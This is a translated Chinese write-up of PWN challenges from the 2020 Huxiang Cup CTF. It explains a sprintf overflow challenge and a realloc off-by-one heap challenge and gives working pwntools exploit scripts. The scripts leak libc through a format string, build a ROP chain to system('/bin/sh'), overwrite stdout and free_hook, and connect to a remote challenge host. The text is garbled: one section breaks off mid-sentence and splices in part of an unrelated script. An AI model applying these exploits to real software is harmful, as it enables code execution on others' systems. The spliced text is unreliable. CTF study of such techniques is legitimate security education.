# 2020 湖湘杯 PWN WriteUp
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
赛后竞赛的界面就关了，题目名称可能会有些不对。
## printf
这个题目的原型题是[google ctf sprint](https://ctftime.org/writeup/23032)。
程序首先是`mmap`了一个`0x4000000`大小的地址空间到`0x4000000`为内地址的内存中，然后拷贝了一大堆的格式化字符串，接着`scanf`读取用户输入的`16`个数字，之后进入`while`循环，在满足判断条件退出之前不断地调用`sprintf`函数。退出循环之后会存在一个`overflow`函数，可以溢出的字节是好像是由`sprintf`的结果指定的。
在比赛的过程中我是直接输入不同的值，观察跳出循环后的状态，发现当前九个数字为`0x20`的时候，最大就会溢出`0x40`个字节，当然这里`if`条件判断中也写了`v12", "1")
    def add(content=b"\n"):
        p.sendlineafter("your choice >", "2")
        p.sendafter("input note:", content)
    def delete(index):
        p.sendlineafter("your choice >", "3")
        p.sendlineafter("index>", str(index))
    def show():
        p.sendlineafter("your choice >", "4")
    def magic(content):
        p.sendlineafter("your choice >", "666")
        p.sendafter("what you want:", content)
    payload = "%p-%p"
    p.sendafter("enter a name: ", payload)
    show_name()
    p.recvuntil("Current user:")
    stack_address = int(p.recvuntil("-", drop=True), 16) + 0x2680
    libc.address = int(p.recvline(), 16) - 0x3c6780
    leave_r = 0x0000000000042361 + libc.address
    p_rdi_r = 0x0000000000021112 + libc.address
    p_rsi_r = 0x00000000000202f8 + libc.address
    bin_sh = flat([
        stack_address, stack_address,
        stack_address,
        p_rdi_r, libc.search(b"/bin/sh\x00").__next__(),
        libc.sym['system']
    ])
    add(bin_sh + b"\n")
    add(bin_sh + b"\n")
    delete(0)
    delete(1)
    show()
    p.recvuntil("index 2:")
    heap_address = u64(p.recvline().strip(b"\n").ljust(8, b"\x00"))
    log.success("stack address {}".format(hex(stack_address)))
    log.success("libc address {}".format(hex(libc.address)))
    log.success("heap address {}".format(hex(heap_address)))
    # gdb.attach(p, "b *$rebase(0x121c)\nb *$rebase(0x12c2)")
    magic(p64(heap_address + 0x10)*4 + p64(heap_address + 0x20)*2)
    p.interactive()
## only_add
这个题目堆调试的眼睛都瞎了
`add`是通过`realloc`分配的，并将地址写到了全局`buf`中，并且只有这一个分配函数，另一个函数就是`buf=0,close(stdout)`，只能调用一次。在`add`函数中有一个`off-by-one`的漏洞。
之前没有接触过`realloc`的堆题目，对其的了解仅限于`realloc(0)`相当于`free`。这里在调试的时候发现，当`realloc`的`size`小于原有的`size`的时候会对原有的`chunk`进行切割，并将切割后的部分做一个类似于`free`的操作。
这里没有`show`函数，因此只能通过覆写`stdout`来进行`libc`基址的泄露，那么首先就需要填满`tcache`。为了方便后面的`off-by-one`的利用，这里我们将`tcache`中的堆块分配为地址相邻的。具体的方法就是分配一个`0x500`附近的堆块，是的`0x500-size>0x410`（这里选择的`size`是`0x90`），也就是对`chunk`切割之后，剩余的`chunk`满足和`top`合并的要求，之后再次申请`size`大小的堆块，那么剩余部分就会合并到`top
chunk`中，显式的释放申请到的`chunk`即`realloc(0)`，此时`tcache`中就填充了一个`size`大小的堆块。重复`8`次，就可以得到一个包含有`main_arena`附近地址的`chunk`。
那么如何分配到这个`chunk`，并修改`chunk`中`main_arena`附近的地址指向`stdout`呢。这里采用的方法就是在`0x30`大小的堆块空间内布置三个堆块，通过`0x30`的第一个堆块`off-by-one`构造堆重叠，覆写`main_arena`附近的地址为`stdout`，通过`0x90`即上一步构造的`chunk` `off-by-one`构造堆重叠覆写`0x30`链表中第二个`chunk`的`fd`指针指向包含有`main_arena`附近的地址的`chunk`。这样就完成了构造，只需要申请三次`0x30`大小的堆块就可以分配到`stdout`附近的地址了。要满足这样的需要在第三个`0x30`大小的堆块（`tcache`中的第一个堆块）申请之前申请一个堆块用于堆重叠，需要在第`7`个`0x90`大小的堆块申请之前，申请一个堆块用于堆重叠，最终构造出的堆布局如下
利用`0x5c0`地址的`chunk`覆写`0x670`地址的`chunk`的`size`位为`0xf1`，使其能够覆写`0x730,0x700`地址的`chunk`。覆写`0x730`堆块的`FD`指针的低一字节为`0xe0`即指向包含有`main_arena`附近地址的堆块。利用`0x760`大小的堆块覆写`0x7b0`大小的堆块的`size`使其能够覆写`0x7d0`的`fd`指针，将低二字节覆写为`stdout`的地址，这里需要`1/16`的爆破。
可以看到这里申请三次`0x30`大小的堆块就可以覆写`stdout`了，在申请释放的过程中需要注意改变堆块的`size`，防止申请的堆块释放的时候又回到了`0x30`的链表中，这里之前用之前的堆重叠堆块覆写`size`位就可以。
在覆写`stdout`泄露得到`libc`基址之后，由于`stdout`并不符合一个堆块的要求，因此其在`realloc`函数中会报错。这里就需要调用`close`函数了，因为此时会清空`buf`指针。之后直接利用堆重叠覆写`tcache`的`fd`指向`free_hook-0x18`的位置，写入`cmd+system_address`。因为此时我们关闭了`stdout`，因此需要将命令设置为`cat
flag 1&>2`。
    # encoding=utf-8
    from pwn import *
    file_path = "./pwn"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 0
    if debug:
        p = process([file_path])
        # gdb.attach(p, "b *$rebase(0xB1B)")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    else:
        p = remote('47.111.104.99', 51905)
        libc = ELF('./libc.so.6')
        one_gadget = 0x0
    def add(size, content=b"\n"):
        p.sendlineafter("choice:", "1")
        p.sendlineafter("Size:", str(size))
        p.sendafter("Data:", content)
    def add_without(size, content=b"\n"):
        p.sendline("1")
        sleep(0.1)
        p.sendline(str(size))
        sleep(0.1)
        p.send(content)
        sleep(0.1)
    def delete():
        p.sendlineafter("choice:", "1")